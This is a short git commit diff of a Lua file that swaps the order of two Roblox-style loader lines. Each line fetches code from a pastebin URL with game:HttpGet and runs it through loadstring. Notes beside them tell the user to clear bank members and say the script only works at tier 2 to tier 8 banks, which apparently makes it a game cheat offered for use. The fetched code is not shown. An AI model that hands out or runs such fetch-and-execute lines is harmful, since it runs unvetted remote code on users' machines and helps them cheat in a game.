f877895f59107b6047e1007d34474d2e67c522ca
XenoLord <103731872+XenoLord@users.noreply.github.com>
2022-04-15 14:54:34 +0300

    Update .lua

--- .lua
+++ .lua
@@ -1,10 +1,10 @@
 Try this first
 
-loadstring(game:HttpGet("https://pastebin.com/raw/MaavrBSR"))() 
+loadstring(game:HttpGet("https://pastebin.com/raw/Wp3B2QfJ"))()
 
 If not works 
 
-loadstring(game:HttpGet("https://pastebin.com/raw/Wp3B2QfJ"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/MaavrBSR"))() 
 
 NOTE: Dont forget to delete your bank members and cancel all outgoing invites
 NOTE2: It only works at tier2 - tier8 banks.
